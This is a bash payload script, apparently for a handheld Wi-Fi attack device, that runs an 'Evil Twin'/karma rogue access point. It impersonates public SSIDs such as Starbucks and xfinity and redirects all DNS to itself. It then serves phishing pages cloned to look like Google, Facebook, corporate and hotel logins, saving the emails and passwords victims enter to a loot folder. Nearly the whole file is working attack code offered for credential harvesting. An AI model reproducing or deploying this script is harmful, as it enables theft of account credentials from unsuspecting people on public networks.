#!/bin/bash
# Title: NullSec Karma Attack
# Author: bad-antics
# Description: Rogue AP that responds to all probe requests with credential capture
# Category: nullsec

LOOT_DIR="/mmc/nullsec"
mkdir -p "$LOOT_DIR"/{creds,logs,probes}

# --- BRIEFING ---
PROMPT "NULLSEC KARMA ATTACK

Rogue AP impersonation:
- Responds to ALL probes
- Captures credentials
- Evil Portal injection

Perfect for harvesting
WiFi credentials.

Press OK to configure."

# --- SSID MODE ---
LIST "SSID MODE

1: Popular Networks
2: From Probe Requests
3: Custom SSID
4: Loud Karma (all)" MODE_SEL

case $MODE_SEL in
    1)
        SSID_LIST="Starbucks WiFi
McDonald's Free WiFi
attwifi
xfinity
NETGEAR
linksys
FreeWiFi"
        ;;
    2)
        if [ -f "$LOOT_DIR/probes/probes_$(date +%Y%m%d).txt" ]; then
            SSID_LIST=$(grep -oE "Probe Request \([^)]+\)" "$LOOT_DIR/probes/probes_$(date +%Y%m%d).txt" | \
                sed 's/Probe Request (//;s/)//' | sort -u | head -20)
        else
            PROMPT "No probes collected!

Run ProbeHunter first
to collect SSIDs.

Using default list."
            SSID_LIST="FreeWiFi"
        fi
        ;;
    3)
        KEYBOARD "ENTER SSID" 32 CUSTOM_SSID
        SSID_LIST="$CUSTOM_SSID"
        ;;
    4)
        SSID_LIST=""
        KARMA_LOUD=1
        ;;
esac

# --- PORTAL TYPE ---
LIST "PORTAL TYPE

1: Generic Login
2: Google Sign-in
3: Facebook Login
4: Corporate WiFi
5: Hotel WiFi
6: No Portal (passive)" PORTAL_SEL

# --- DURATION ---
LIST "ATTACK DURATION

1: Quick (5 min)
2: Standard (15 min)
3: Extended (30 min)
4: Marathon (1 hour)
5: Until Stopped" DUR_SEL

case $DUR_SEL in
    1) DURATION=300 ;;
    2) DURATION=900 ;;
    3) DURATION=1800 ;;
    4) DURATION=3600 ;;
    5) DURATION=0 ;;
    *) DURATION=900 ;;
esac

# --- CONFIRMATION ---
PROMPT "KARMA READY

Mode: $MODE_SEL
Portal: $PORTAL_SEL
Duration: $((DURATION/60)) min

This will start a rogue AP.
Credentials saved to:
$LOOT_DIR/creds

Press OK to START."

# --- SETUP PORTAL ---
PORTAL_DIR="/tmp/portal"
mkdir -p "$PORTAL_DIR"

case $PORTAL_SEL in
    1) # Generic
        cat > "$PORTAL_DIR/index.html" << 'HTML'
<!DOCTYPE html>
<html><head><title>WiFi Login</title>
<style>body{font-family:Arial;background:#1a1a1a;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{background:#2d2d2d;padding:40px;border-radius:10px;box-shadow:0 0 20px #ff0000}
input{width:100%;padding:12px;margin:8px 0;border:none;border-radius:5px}
button{width:100%;padding:12px;background:#ff0000;color:#fff;border:none;border-radius:5px;cursor:pointer}
</style></head><body>
<div class="box"><h2>WiFi Login</h2>
<form action="/capture" method="POST">
<input type="text" name="email" placeholder="Email">
<input type="password" name="password" placeholder="Password">
<button type="submit">Connect</button></form></div></body></html>
HTML
        ;;
    2) # Google
        cat > "$PORTAL_DIR/index.html" << 'HTML'
<!DOCTYPE html>
<html><head><title>Sign in - Google Accounts</title>
<style>body{font-family:'Roboto',Arial;background:#fff;display:flex;justify-content:center;padding-top:100px}
.box{width:400px;padding:40px;border:1px solid #ddd;border-radius:8px}
img{width:75px;margin-bottom:15px}h1{font-size:24px;font-weight:400}
input{width:100%;padding:15px;margin:8px 0;border:1px solid #ddd;border-radius:4px;font-size:16px}
button{background:#1a73e8;color:#fff;padding:12px 24px;border:none;border-radius:4px;font-size:14px;cursor:pointer;float:right;margin-top:20px}
</style></head><body>
<div class="box"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%234285F4' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%2334A853' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z'/%3E%3Cpath fill='%23EA4335' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E">
<h1>Sign in</h1><p>to continue to WiFi</p>
<form action="/capture" method="POST">
<input type="email" name="email" placeholder="Email or phone">
<input type="password" name="password" placeholder="Enter your password">
<button type="submit">Next</button></form></div></body></html>
HTML
        ;;
    3) # Facebook
        cat > "$PORTAL_DIR/index.html" << 'HTML'
<!DOCTYPE html>
<html><head><title>Log in to Facebook</title>
<style>body{font-family:Helvetica,Arial;background:#f0f2f5;margin:0;padding:0}
.header{background:#1877f2;padding:15px;text-align:center}
.logo{color:#fff;font-size:30px;font-weight:bold;letter-spacing:-1px}
.container{display:flex;justify-content:center;padding:100px 0}
.box{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1);width:400px}
input{width:100%;padding:14px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px}
button{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer;margin-top:10px}
</style></head><body>
<div class="header"><span class="logo">facebook</span></div>
<div class="container"><div class="box">
<form action="/capture" method="POST">
<input type="text" name="email" placeholder="Email address or phone number">
<input type="password" name="password" placeholder="Password">
<button type="submit">Log In</button></form></div></div></body></html>
HTML
        ;;
    4|5) # Corporate/Hotel
        cat > "$PORTAL_DIR/index.html" << 'HTML'
<!DOCTYPE html>
<html><head><title>WiFi Authentication</title>
<style>body{font-family:Arial;background:linear-gradient(135deg,#1a1a2e,#16213e);color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{background:rgba(255,255,255,0.1);padding:50px;border-radius:15px;backdrop-filter:blur(10px);width:400px}
h2{text-align:center;margin-bottom:30px}input{width:100%;padding:15px;margin:10px 0;border:none;border-radius:8px;background:rgba(255,255,255,0.2);color:#fff}
input::placeholder{color:#aaa}button{width:100%;padding:15px;background:#e94560;border:none;border-radius:8px;color:#fff;font-size:16px;cursor:pointer;margin-top:20px}
</style></head><body>
<div class="box"><h2>🔐 Network Authentication</h2>
<form action="/capture" method="POST">
<input type="text" name="username" placeholder="Username">
<input type="password" name="password" placeholder="Password">
<input type="text" name="room" placeholder="Room Number (optional)">
<button type="submit">Authenticate</button></form></div></body></html>
HTML
        ;;
esac

# Capture script
cat > "$PORTAL_DIR/capture.sh" << 'CAPTURE'
#!/bin/sh
while read line; do
    echo "$(date): $line" >> /mmc/nullsec/creds/captured_$(date +%Y%m%d).txt
done
CAPTURE
chmod +x "$PORTAL_DIR/capture.sh"

# --- START ATTACK ---
SCREEN "KARMA ACTIVE" "Rogue AP broadcasting..." 3
LED Y FAST

# Configure AP interface
AP_IFACE="wlan0"

# Create hostapd config
cat > /tmp/hostapd.conf << EOF
interface=$AP_IFACE
driver=nl80211
ssid=${SSID_LIST%% *}
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
EOF

# Add karma if supported
if [ "$KARMA_LOUD" = "1" ]; then
    echo "# Karma mode - respond to all probes" >> /tmp/hostapd.conf
fi

# Start services
ifconfig $AP_IFACE 10.0.0.1 netmask 255.255.255.0 up

# DHCP
cat > /tmp/dnsmasq.conf << EOF
interface=$AP_IFACE
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
EOF

dnsmasq -C /tmp/dnsmasq.conf &
DNSMASQ_PID=$!

# Start hostapd
hostapd /tmp/hostapd.conf &
HOSTAPD_PID=$!

# Simple web server for portal
if [ "$PORTAL_SEL" != "6" ]; then
    cd "$PORTAL_DIR"
    while true; do
        nc -l -p 80 -e /bin/sh -c '
            read request
            if echo "$request" | grep -q "POST"; then
                while read header; do
                    [ -z "$header" ] && break
                done
                read body
                echo "$body" | tr "&" "\n" >> /mmc/nullsec/creds/captured_$(date +%Y%m%d).txt
            fi
            echo "HTTP/1.1 302 Found"
            echo "Location: http://10.0.0.1/"
            echo ""
            cat index.html
        '
    done &
    WEB_PID=$!
fi

# Monitor and wait
CRED_COUNT=0
START_TIME=$(date +%s)

while true; do
    # Count credentials
    NEW_COUNT=$(wc -l < "$LOOT_DIR/creds/captured_$(date +%Y%m%d).txt" 2>/dev/null || echo 0)
    
    if [ "$NEW_COUNT" -gt "$CRED_COUNT" ]; then
        CRED_COUNT=$NEW_COUNT
        LED G FAST
        sleep 1
        LED Y FAST
    fi
    
    # Check duration
    if [ "$DURATION" -gt 0 ]; then
        ELAPSED=$(($(date +%s) - START_TIME))
        REMAINING=$((DURATION - ELAPSED))
        
        if [ $ELAPSED -ge $DURATION ]; then
            break
        fi
        
        # Update status every 30s
        if [ $((ELAPSED % 30)) -eq 0 ]; then
            SCREEN "KARMA ACTIVE" "Creds: $CRED_COUNT | ${REMAINING}s left" 2
        fi
    fi
    
    sleep 5
done

# --- CLEANUP ---
kill $HOSTAPD_PID $DNSMASQ_PID $WEB_PID 2>/dev/null
killall hostapd dnsmasq nc 2>/dev/null
ifconfig $AP_IFACE down

# --- RESULTS ---
LED G SOLID

FINAL_CREDS=$(wc -l < "$LOOT_DIR/creds/captured_$(date +%Y%m%d).txt" 2>/dev/null || echo 0)

PROMPT "KARMA COMPLETE

Credentials Captured: $FINAL_CREDS

Saved to:
$LOOT_DIR/creds/

Press OK to view captures
Press BACK to exit."

BUTTON_CHECK
if [ "$BUTTON" = "a" ]; then
    if [ -f "$LOOT_DIR/creds/captured_$(date +%Y%m%d).txt" ]; then
        CRED_DATA=$(tail -10 "$LOOT_DIR/creds/captured_$(date +%Y%m%d).txt")
        PROMPT "CAPTURED CREDS:

$CRED_DATA"
    fi
fi

LED OFF
